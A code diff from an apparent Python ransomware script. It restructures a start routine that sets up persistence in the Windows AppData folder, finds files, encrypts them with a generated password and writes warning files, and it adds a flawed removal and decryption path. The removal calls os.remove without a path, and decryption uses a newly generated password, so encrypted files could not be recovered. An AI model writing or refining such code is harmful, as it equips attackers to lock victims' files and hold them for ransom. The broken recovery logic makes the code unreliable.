@@ -73,16 +73,23 @@ def createWarnings(check=True):
         with open(path, "w") as f:
             f.write(".LOG")
 
+def removepersistence():
+    username = os.path.expanduser("~")
+    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
+    os.remove()
+
 
 def start(mode="E"):
-    if createWarnings():
-        persistence()
-        files_t = find_files(mode)
-        password = genpass()
-        encryptFiles(files_t, password)
-        #decryptFiles(files_t, password)
-        createWarnings(check=False)
-
+    password = genpass()
+    files_t = find_files(mode)
+    if mode == "E":
+        if createWarnings():
+            persistence()
+            encryptFiles(files_t, password)
+            createWarnings(check=False)
+    else:
+        decryptFiles(files_t, password)
+        removepersistence()
 
 if __name__ == "__main__":
     start(mode="E")
